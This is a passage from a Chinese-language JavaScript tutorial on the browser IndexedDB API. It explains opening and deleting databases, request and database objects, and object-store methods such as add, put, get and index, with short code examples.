\uff1a\u4e0a\u4e00\u6b21\u7684\u6570\u636e\u5e93\u8fde\u63a5\u8fd8\u672a\u5173\u95ed\u3002 \u7b2c\u4e00\u6b21\u6253\u5f00\u6570\u636e\u5e93\u65f6\uff0c\u4f1a\u5148\u89e6\u53d1 upgradeneeded \u4e8b\u4ef6\uff0c\u7136\u540e\u89e6\u53d1 success \u4e8b\u4ef6\u3002 \u6839\u636e\u4e0d\u540c\u7684\u9700\u8981\uff0c\u5bf9\u4e0a\u97624\u79cd\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var openRequest = indexedDB . open ( 'test' , 1 ); var db ; openRequest . onupgradeneeded = function ( e ) { console . log ( 'Upgrading...' ); } openRequest . onsuccess = function ( e ) { console . log ( 'Success!' ); db = openRequest . result ; } openRequest . onerror = function ( e ) { console . log ( 'Error' ); console . log ( e ); } \u4e0a\u9762\u4ee3\u7801\u6709\u4e24\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002\u9996\u5148\uff0c open() \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08IDBOpenDBRequest\uff09\uff0c\u76d1\u542c\u51fd\u6570\u5c31\u5b9a\u4e49\u5728\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u9762\u3002\u5176\u6b21\uff0c success \u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u4ece openRequest.result \u5c5e\u6027\u53ef\u4ee5\u62ff\u5230\u5df2\u7ecf\u6253\u5f00\u7684 IndexedDB \u6570\u636e\u5e93\u5bf9\u8c61\u3002 indexedDB.deleteDatabase() \u00b6 indexedDB.deleteDatabase() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u4e00\u4e2a\u6570\u636e\u5e93\uff0c\u53c2\u6570\u4e3a\u6570\u636e\u5e93\u7684\u540d\u5b57\u3002\u5b83\u4f1a\u7acb\u523b\u8fd4\u56de\u4e00\u4e2a IDBOpenDBRequest \u5bf9\u8c61\uff0c\u7136\u540e\u5bf9\u6570\u636e\u5e93\u6267\u884c\u5f02\u6b65\u5220\u9664\u3002\u5220\u9664\u64cd\u4f5c\u7684\u7ed3\u679c\u4f1a\u901a\u8fc7\u4e8b\u4ef6\u901a\u77e5\uff0c IDBOpenDBRequest \u5bf9\u8c61\u53ef\u4ee5\u76d1\u542c\u4ee5\u4e0b\u4e8b\u4ef6\u3002 success \uff1a\u5220\u9664\u6210\u529f error \uff1a\u5220\u9664\u62a5\u9519 1 2 3 4 5 6 7 8 9 var DBDeleteRequest = window . indexedDB . deleteDatabase ( 'demo' ); DBDeleteRequest . onerror = function ( event ) { console . log ( 'Error' ); }; DBDeleteRequest . onsuccess = function ( event ) { console . log ( 'success' ); }; \u8c03\u7528 deleteDatabase() \u65b9\u6cd5\u4ee5\u540e\uff0c\u5f53\u524d\u6570\u636e\u5e93\u7684\u5176\u4ed6\u5df2\u7ecf\u6253\u5f00\u7684\u8fde\u63a5\u90fd\u4f1a\u63a5\u6536\u5230 versionchange \u4e8b\u4ef6\u3002 \u6ce8\u610f\uff0c\u5220\u9664\u4e0d\u5b58\u5728\u7684\u6570\u636e\u5e93\u5e76\u4e0d\u4f1a\u62a5\u9519\u3002 indexedDB.cmp() \u00b6 indexedDB.cmp() \u65b9\u6cd5\u6bd4\u8f83\u4e24\u4e2a\u503c\u662f\u5426\u4e3a indexedDB \u7684\u76f8\u540c\u7684\u4e3b\u952e\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u6bd4\u8f83\u7684\u7ed3\u679c\uff1a 0 \u8868\u793a\u76f8\u540c\uff0c 1 \u8868\u793a\u7b2c\u4e00\u4e2a\u4e3b\u952e\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u4e3b\u952e\uff0c -1 \u8868\u793a\u7b2c\u4e00\u4e2a\u4e3b\u952e\u5c0f\u4e8e\u7b2c\u4e8c\u4e2a\u4e3b\u952e\u3002 1 window . indexedDB . cmp ( 1 , 2 ) // -1 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u80fd\u7528\u6765\u6bd4\u8f83\u4efb\u610f\u7684 JavaScript \u503c\u3002\u5982\u679c\u53c2\u6570\u662f\u5e03\u5c14\u503c\u6216\u5bf9\u8c61\uff0c\u5b83\u4f1a\u62a5\u9519\u3002 1 2 window . indexedDB . cmp ( 1 , true ) // \u62a5\u9519 window . indexedDB . cmp ({}, {}) // \u62a5\u9519 IDBRequest \u5bf9\u8c61 \u00b6 IDBRequest \u5bf9\u8c61\u8868\u793a\u6253\u5f00\u7684\u6570\u636e\u5e93\u8fde\u63a5\uff0c indexedDB.open() \u65b9\u6cd5\u548c indexedDB.deleteDatabase() \u65b9\u6cd5\u4f1a\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\u3002\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u90fd\u662f\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5b8c\u6210\u7684\u3002 \u8fd9\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u662f\u5f02\u6b65\u64cd\u4f5c\uff0c\u8981\u901a\u8fc7 readyState \u5c5e\u6027\u5224\u65ad\u662f\u5426\u5b8c\u6210\uff0c\u5982\u679c\u4e3a pending \u5c31\u8868\u793a\u64cd\u4f5c\u6b63\u5728\u8fdb\u884c\uff0c\u5982\u679c\u4e3a done \u5c31\u8868\u793a\u64cd\u4f5c\u5b8c\u6210\uff0c\u53ef\u80fd\u6210\u529f\u4e5f\u53ef\u80fd\u5931\u8d25\u3002 \u64cd\u4f5c\u5b8c\u6210\u4ee5\u540e\uff0c\u89e6\u53d1 success \u4e8b\u4ef6\u6216 error \u4e8b\u4ef6\uff0c\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7 result \u5c5e\u6027\u548c error \u5c5e\u6027\u62ff\u5230\u64cd\u4f5c\u7ed3\u679c\u3002\u5982\u679c\u5728 pending \u9636\u6bb5\uff0c\u5c31\u53bb\u8bfb\u53d6\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u662f\u4f1a\u62a5\u9519\u7684\u3002 IDBRequest \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBRequest.readyState \uff1a\u7b49\u4e8e pending \u8868\u793a\u64cd\u4f5c\u6b63\u5728\u8fdb\u884c\uff0c\u7b49\u4e8e done \u8868\u793a\u64cd\u4f5c\u6b63\u5728\u5b8c\u6210\u3002 IDBRequest.result \uff1a\u8fd4\u56de\u8bf7\u6c42\u7684\u7ed3\u679c\u3002\u5982\u679c\u8bf7\u6c42\u5931\u8d25\u3001\u7ed3\u679c\u4e0d\u53ef\u7528\uff0c\u8bfb\u53d6\u8be5\u5c5e\u6027\u4f1a\u62a5\u9519\u3002 IDBRequest.error \uff1a\u8bf7\u6c42\u5931\u8d25\u65f6\uff0c\u8fd4\u56de\u9519\u8bef\u5bf9\u8c61\u3002 IDBRequest.source \uff1a\u8fd4\u56de\u8bf7\u6c42\u7684\u6765\u6e90\uff08\u6bd4\u5982\u7d22\u5f15\u5bf9\u8c61\u6216 ObjectStore\uff09\u3002 IDBRequest.transaction \uff1a\u8fd4\u56de\u5f53\u524d\u8bf7\u6c42\u6b63\u5728\u8fdb\u884c\u7684\u4e8b\u52a1\uff0c\u5982\u679c\u4e0d\u5305\u542b\u4e8b\u52a1\uff0c\u8fd4\u56de null \u3002 IDBRequest.onsuccess \uff1a\u6307\u5b9a success \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBRequest.onerror \uff1a\u6307\u5b9a error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBOpenDBRequest \u5bf9\u8c61\u7ee7\u627f\u4e86 IDBRequest \u5bf9\u8c61\uff0c\u63d0\u4f9b\u4e86\u4e24\u4e2a\u989d\u5916\u7684\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027\u3002 IDBOpenDBRequest.onblocked \uff1a\u6307\u5b9a blocked \u4e8b\u4ef6\uff08 upgradeneeded \u4e8b\u4ef6\u89e6\u53d1\u65f6\uff0c\u6570\u636e\u5e93\u4ecd\u7136\u5728\u4f7f\u7528\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBOpenDBRequest.onupgradeneeded \uff1a upgradeneeded \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBDatabase \u5bf9\u8c61 \u00b6 \u6253\u5f00\u6570\u636e\u6210\u529f\u4ee5\u540e\uff0c\u53ef\u4ee5\u4ece IDBOpenDBRequest \u5bf9\u8c61\u7684 result \u5c5e\u6027\u4e0a\u9762\uff0c\u62ff\u5230\u4e00\u4e2a IDBDatabase \u5bf9\u8c61\uff0c\u5b83\u8868\u793a\u8fde\u63a5\u7684\u6570\u636e\u5e93\u3002\u540e\u9762\u5bf9\u6570\u636e\u5e93\u7684\u64cd\u4f5c\uff0c\u90fd\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5b8c\u6210\u3002 1 2 3 4 5 6 7 8 9 10 11 var db ; var DBOpenRequest = window . indexedDB . open ( 'demo' , 1 ); DBOpenRequest . onerror = function ( event ) { console . log ( 'Error' ); }; DBOpenRequest . onsuccess = function ( event ) { db = DBOpenRequest . result ; // ... }; \u5c5e\u6027 \u00b6 IDBDatabase \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBDatabase.name \uff1a\u5b57\u7b26\u4e32\uff0c\u6570\u636e\u5e93\u540d\u79f0\u3002 IDBDatabase.version \uff1a\u6574\u6570\uff0c\u6570\u636e\u5e93\u7248\u672c\u3002\u6570\u636e\u5e93\u7b2c\u4e00\u6b21\u521b\u5efa\u65f6\uff0c\u8be5\u5c5e\u6027\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 IDBDatabase.objectStoreNames \uff1aDOMStringList \u5bf9\u8c61\uff08\u5b57\u7b26\u4e32\u7684\u96c6\u5408\uff09\uff0c\u5305\u542b\u5f53\u524d\u6570\u636e\u7684\u6240\u6709 object store \u7684\u540d\u5b57\u3002 IDBDatabase.onabort \uff1a\u6307\u5b9a abort \u4e8b\u4ef6\uff08\u4e8b\u52a1\u4e2d\u6b62\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBDatabase.onclose \uff1a\u6307\u5b9a close \u4e8b\u4ef6\uff08\u6570\u636e\u5e93\u610f\u5916\u5173\u95ed\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBDatabase.onerror \uff1a\u6307\u5b9a error \u4e8b\u4ef6\uff08\u8bbf\u95ee\u6570\u636e\u5e93\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002 IDBDatabase.onversionchange \uff1a\u6570\u636e\u5e93\u7248\u672c\u53d8\u5316\u65f6\u89e6\u53d1\uff08\u53d1\u751f upgradeneeded \u4e8b\u4ef6\uff0c\u6216\u8c03\u7528 indexedDB.deleteDatabase() \uff09\u3002 \u4e0b\u9762\u662f objectStoreNames \u5c5e\u6027\u7684\u4f8b\u5b50\u3002\u8be5\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a DOMStringList \u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u5f53\u524d\u6570\u636e\u5e93\u6240\u6709\u5bf9\u8c61\u4ed3\u5e93\u7684\u540d\u79f0\uff08\u5373\u8868\u540d\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 DOMStringList \u5bf9\u8c61\u7684 contains \u65b9\u6cd5\uff0c\u68c0\u67e5\u6570\u636e\u5e93\u662f\u5426\u5305\u542b\u67d0\u4e2a\u5bf9\u8c61\u4ed3\u5e93\u3002 1 2 3 if ( ! db . objectStoreNames . contains ( 'firstOS' )) { db . createObjectStore ( 'firstOS' ); } \u4e0a\u9762\u4ee3\u7801\u5148\u5224\u65ad\u67d0\u4e2a\u5bf9\u8c61\u4ed3\u5e93\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5c31\u521b\u5efa\u8be5\u5bf9\u8c61\u4ed3\u5e93\u3002 \u65b9\u6cd5 \u00b6 IDBDatabase \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\u3002 IDBDatabase.close() \uff1a\u5173\u95ed\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u5b9e\u9645\u4f1a\u7b49\u6240\u6709\u4e8b\u52a1\u5b8c\u6210\u540e\u518d\u5173\u95ed\u3002 IDBDatabase.createObjectStore() \uff1a\u521b\u5efa\u5b58\u653e\u6570\u636e\u7684\u5bf9\u8c61\u4ed3\u5e93\uff0c\u7c7b\u4f3c\u4e8e\u4f20\u7edf\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u8868\u683c\uff0c\u8fd4\u56de\u4e00\u4e2a IDBObjectStore \u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 versionchange \u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u4e2d\u8c03\u7528\u3002 IDBDatabase.deleteObjectStore() \uff1a\u5220\u9664\u6307\u5b9a\u7684\u5bf9\u8c61\u4ed3\u5e93\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728 versionchange \u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u4e2d\u8c03\u7528\u3002 IDBDatabase.transaction() \uff1a\u8fd4\u56de\u4e00\u4e2a IDBTransaction \u4e8b\u52a1\u5bf9\u8c61\u3002 \u4e0b\u9762\u662f createObjectStore() \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var request = window . indexedDB . open ( 'demo' , 2 ); request . onupgradeneeded = function ( event ) { var db = event . target . result ; db . onerror = function ( event ) { console . log ( 'error' ); }; var objectStore = db . createObjectStore ( 'items' ); // ... }; \u4e0a\u9762\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a items \u7684\u5bf9\u8c61\u4ed3\u5e93\uff0c\u5982\u679c\u8be5\u5bf9\u8c61\u4ed3\u5e93\u5df2\u7ecf\u5b58\u5728\uff0c\u5c31\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002\u4e3a\u4e86\u907f\u514d\u51fa\u9519\uff0c\u9700\u8981\u7528\u5230\u4e0b\u6587\u7684 objectStoreNames \u5c5e\u6027\uff0c\u68c0\u67e5\u5df2\u6709\u54ea\u4e9b\u5bf9\u8c61\u4ed3\u5e93\u3002 createObjectStore() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u5bf9\u8c61\u53c2\u6570\uff0c\u7528\u6765\u8bbe\u7f6e\u5bf9\u8c61\u4ed3\u5e93\u7684\u5c5e\u6027\u3002 1 2 db . createObjectStore ( 'test' , { keyPath : 'email' }); db . createObjectStore ( 'test2' , { autoIncrement : true }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c keyPath \u5c5e\u6027\u8868\u793a\u4e3b\u952e\uff08\u7531\u4e8e\u4e3b\u952e\u7684\u503c\u4e0d\u80fd\u91cd\u590d\uff0c\u6240\u4ee5\u4e0a\u4f8b\u5b58\u5165\u4e4b\u524d\uff0c\u5fc5\u987b\u4fdd\u8bc1\u6570\u636e\u7684 email \u5c5e\u6027\u503c\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff09\uff0c\u9ed8\u8ba4\u503c\u4e3a null \uff1b autoIncrement \u5c5e\u6027\u8868\u793a\uff0c\u662f\u5426\u4f7f\u7528\u81ea\u52a8\u9012\u589e\u7684\u6574\u6570\u4f5c\u4e3a\u4e3b\u952e\uff08\u7b2c\u4e00\u4e2a\u6570\u636e\u8bb0\u5f55\u4e3a1\uff0c\u7b2c\u4e8c\u4e2a\u6570\u636e\u8bb0\u5f55\u4e3a2\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff09\uff0c\u9ed8\u8ba4\u4e3a false \u3002\u4e00\u822c\u6765\u8bf4\uff0c keyPath \u548c autoIncrement \u5c5e\u6027\u53ea\u8981\u4f7f\u7528\u4e00\u4e2a\u5c31\u591f\u4e86\uff0c\u5982\u679c\u4e24\u4e2a\u540c\u65f6\u4f7f\u7528\uff0c\u8868\u793a\u4e3b\u952e\u4e3a\u9012\u589e\u7684\u6574\u6570\uff0c\u4e14\u5bf9\u8c61\u4e0d\u5f97\u7f3a\u5c11 keyPath \u6307\u5b9a\u7684\u5c5e\u6027\u3002 \u4e0b\u9762\u662f deleteObjectStore() \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var dbName = 'sampleDB' ; var dbVersion = 2 ; var request = indexedDB . open ( dbName , dbVersion ); request . onupgradeneeded = function ( e ) { var db = request . result ; if ( e . oldVersion < 1 ) { db . createObjectStore ( 'store1' ); } if ( e . oldVersion < 2 ) { db . deleteObjectStore ( 'store1' ); db . createObjectStore ( 'store2' ); } // ... }; \u4e0b\u9762\u662f transaction() \u65b9\u6cd5\u7684\u4f8b\u5b50\uff0c\u8be5\u65b9\u6cd5\u7528\u4e8e\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93\u4e8b\u52a1\uff0c\u8fd4\u56de\u4e00\u4e2a IDBTransaction \u5bf9\u8c61\u3002\u5411\u6570\u636e\u5e93\u6dfb\u52a0\u6570\u636e\u4e4b\u524d\uff0c\u5fc5\u987b\u5148\u521b\u5efa\u6570\u636e\u5e93\u4e8b\u52a1\u3002 1 var t = db . transaction ([ 'items' ], 'readwrite' ); transaction() \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u91cc\u9762\u662f\u6240\u6d89\u53ca\u7684\u5bf9\u8c61\u4ed3\u5e93\uff0c\u901a\u5e38\u662f\u53ea\u6709\u4e00\u4e2a\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u8868\u793a\u64cd\u4f5c\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\u3002\u76ee\u524d\uff0c\u64cd\u4f5c\u7c7b\u578b\u53ea\u6709\u4e24\u79cd\uff1a readonly \uff08\u53ea\u8bfb\uff09\u548c readwrite \uff08\u8bfb\u5199\uff09\u3002\u6dfb\u52a0\u6570\u636e\u4f7f\u7528 readwrite \uff0c\u8bfb\u53d6\u6570\u636e\u4f7f\u7528 readonly \u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u7701\u7565\u65f6\u9ed8\u8ba4\u4e3a readonly \u6a21\u5f0f\u3002 IDBObjectStore \u5bf9\u8c61 \u00b6 IDBObjectStore \u5bf9\u8c61\u5bf9\u5e94\u4e00\u4e2a\u5bf9\u8c61\u4ed3\u5e93\uff08object store\uff09\u3002 IDBDatabase.createObjectStore() \u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u4e00\u4e2a IDBObjectStore \u5bf9\u8c61\u3002 IDBDatabase \u5bf9\u8c61\u7684 transaction() \u8fd4\u56de\u4e00\u4e2a\u4e8b\u52a1\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u7684 objectStore() \u65b9\u6cd5\u8fd4\u56de IDBObjectStore \u5bf9\u8c61\uff0c\u56e0\u6b64\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u94fe\u5f0f\u5199\u6cd5\u3002 1 2 3 4 db . transaction ([ 'test' ], 'readonly' ) . objectStore ( 'test' ) . get ( X ) . onsuccess = function ( e ) {} \u5c5e\u6027 \u00b6 IDBObjectStore \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 IDBObjectStore.indexNames \uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08DOMStringList\uff09\uff0c\u5305\u542b\u4e86\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u6240\u6709\u7d22\u5f15\u3002 IDBObjectStore.keyPath \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u4e3b\u952e\u3002 IDBObjectStore.name \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u540d\u79f0\u3002 IDBObjectStore.transaction \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u6240\u5c5e\u7684\u4e8b\u52a1\u5bf9\u8c61\u3002 IDBObjectStore.autoIncrement \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e3b\u952e\u662f\u5426\u4f1a\u81ea\u52a8\u9012\u589e\u3002 \u65b9\u6cd5 \u00b6 IDBObjectStore \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\u3002 \uff081\uff09IDBObjectStore.add() IDBObjectStore.add() \u7528\u4e8e\u5411\u5bf9\u8c61\u4ed3\u5e93\u6dfb\u52a0\u6570\u636e\uff0c\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u53ea\u7528\u4e8e\u6dfb\u52a0\u6570\u636e\uff0c\u5982\u679c\u4e3b\u952e\u76f8\u540c\u4f1a\u62a5\u9519\uff0c\u56e0\u6b64\u66f4\u65b0\u6570\u636e\u5fc5\u987b\u4f7f\u7528 put() \u65b9\u6cd5\u3002 1 objectStore . add ( value , key ) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u952e\u503c\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e3b\u952e\uff0c\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u5982\u679c\u7701\u7565\u9ed8\u8ba4\u4e3a null \u3002 \u521b\u5efa\u4e8b\u52a1\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6\u5bf9\u8c61\u4ed3\u5e93\uff0c\u7136\u540e\u4f7f\u7528 add() \u65b9\u6cd5\u5f80\u91cc\u9762\u6dfb\u52a0\u6570\u636e\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 var db ; var DBOpenRequest = window . indexedDB . open ( 'demo' , 1 ); DBOpenRequest . onsuccess = function ( event ) { db = DBOpenRequest . result ; var transaction = db . transaction ([ 'items' ], 'readwrite' ); transaction . oncomplete = function ( event ) { console . log ( 'transaction success' ); }; transaction . onerror = function ( event ) { console . log ( 'transaction error: ' + transaction . error ); }; var objectStore = transaction . objectStore ( 'items' ); var objectStoreRequest = objectStore . add ({ foo : 1 }); objectStoreRequest . onsuccess = function ( event ) { console . log ( 'add data success' ); }; }; \uff082\uff09IDBObjectStore.put() IDBObjectStore.put() \u65b9\u6cd5\u7528\u4e8e\u66f4\u65b0\u67d0\u4e2a\u4e3b\u952e\u5bf9\u5e94\u7684\u6570\u636e\u8bb0\u5f55\uff0c\u5982\u679c\u5bf9\u5e94\u7684\u952e\u503c\u4e0d\u5b58\u5728\uff0c\u5219\u63d2\u5165\u4e00\u6761\u65b0\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . put ( item , key ) \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u65b0\u6570\u636e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u4e3b\u952e\uff0c\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u4e14\u53ea\u5728\u81ea\u52a8\u9012\u589e\u65f6\u624d\u6709\u5fc5\u8981\u63d0\u4f9b\uff0c\u56e0\u4e3a\u90a3\u65f6\u4e3b\u952e\u4e0d\u5305\u542b\u5728\u6570\u636e\u503c\u91cc\u9762\u3002 \uff083\uff09IDBObjectStore.clear() IDBObjectStore.clear() \u5220\u9664\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u6240\u6709\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . clear () \u8be5\u65b9\u6cd5\u4e0d\u9700\u8981\u53c2\u6570\u3002 \uff084\uff09IDBObjectStore.delete() IDBObjectStore.delete() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6307\u5b9a\u4e3b\u952e\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . delete ( Key ) \u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u4e3a\u4e3b\u952e\u7684\u503c\u3002 \uff085\uff09IDBObjectStore.count() IDBObjectStore.count() \u65b9\u6cd5\u7528\u4e8e\u8ba1\u7b97\u8bb0\u5f55\u7684\u6570\u91cf\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 IDBObjectStore . count ( key ) \u4e0d\u5e26\u53c2\u6570\u65f6\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u6240\u6709\u8bb0\u5f55\u6570\u91cf\u3002\u5982\u679c\u4e3b\u952e\u6216 IDBKeyRange \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u5219\u8fd4\u56de\u5bf9\u5e94\u7684\u8bb0\u5f55\u6570\u91cf\u3002 \uff086\uff09IDBObjectStore.getKey() IDBObjectStore.getKey() \u7528\u4e8e\u83b7\u53d6\u4e3b\u952e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . getKey ( key ) \u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u4e3b\u952e\u503c\u6216 IDBKeyRange \u5bf9\u8c61\u3002 \uff087\uff09IDBObjectStore.get() IDBObjectStore.get() \u7528\u4e8e\u83b7\u53d6\u4e3b\u952e\u5bf9\u5e94\u7684\u6570\u636e\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 objectStore . get ( key ) \uff088\uff09IDBObjectStore.getAll() DBObjectStore.getAll() \u7528\u4e8e\u83b7\u53d6\u5bf9\u8c61\u4ed3\u5e93\u7684\u8bb0\u5f55\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 // \u83b7\u53d6\u6240\u6709\u8bb0\u5f55 objectStore . getAll () // \u83b7\u53d6\u6240\u6709\u7b26\u5408\u6307\u5b9a\u4e3b\u952e\u6216 IDBKeyRange \u7684\u8bb0\u5f55 objectStore . getAll ( query ) // \u6307\u5b9a\u83b7\u53d6\u8bb0\u5f55\u7684\u6570\u91cf objectStore . getAll ( query , count ) \uff089\uff09IDBObjectStore.getAllKeys() IDBObjectStore.getAllKeys() \u7528\u4e8e\u83b7\u53d6\u6240\u6709\u7b26\u5408\u6761\u4ef6\u7684\u4e3b\u952e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 // \u83b7\u53d6\u6240\u6709\u8bb0\u5f55\u7684\u4e3b\u952e objectStore . getAllKeys () // \u83b7\u53d6\u6240\u6709\u7b26\u5408\u6761\u4ef6\u7684\u4e3b\u952e objectStore . getAllKeys ( query ) // \u6307\u5b9a\u83b7\u53d6\u4e3b\u952e\u7684\u6570\u91cf objectStore . getAllKeys ( query , count ) \uff0810\uff09IDBObjectStore.index() IDBObjectStore.index() \u65b9\u6cd5\u8fd4\u56de\u6307\u5b9a\u540d\u79f0\u7684\u7d22\u5f15\u5bf9\u8c61 IDBIndex\u3002 1 objectStore . index ( name ) \u6709\u4e86\u7d22\u5f15\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u9488\u5bf9\u7d22\u5f15\u6240\u5728\u7684\u5c5e\u6027\u8bfb\u53d6\u6570\u636e\u3002 1 2 3 4 5 var t = db . transaction ([ 'people' ], 'readonly' ); var store = t . objectStore ( 'people' ); var index = store . index ( 'name' ); var request = index . get ( 'foo' ); \u4e0a\u9762\u4ee3\u7801\u6253\u5f00\u5bf9\u8c61\u4ed3\u5e93\u4ee5\u540e\uff0c\u5148\u7528 index() \u65b9\u6cd5\u6307\u5b9a\u83b7\u53d6 name \u5c5e\u6027\u7684\u7d22\u5f15\uff0c\u7136\u540e\u7528 get() \u65b9\u6cd5\u8bfb\u53d6\u67d0\u4e2a name \u5c5e\u6027( foo )\u5bf9\u5e94\u7684\u6570\u636e\u3002\u5982\u679c name \u5c5e\u6027\u4e0d\u662f\u5bf9\u5e94\u552f\u4e00\u503c\uff0c\u8fd9\u65f6 get() \u65b9\u6cd5\u6709\u53ef\u80fd\u53d6\u56de\u591a\u4e2a\u6570\u636e\u5bf9\u8c61\u3002\u53e6\u5916\uff0c get() 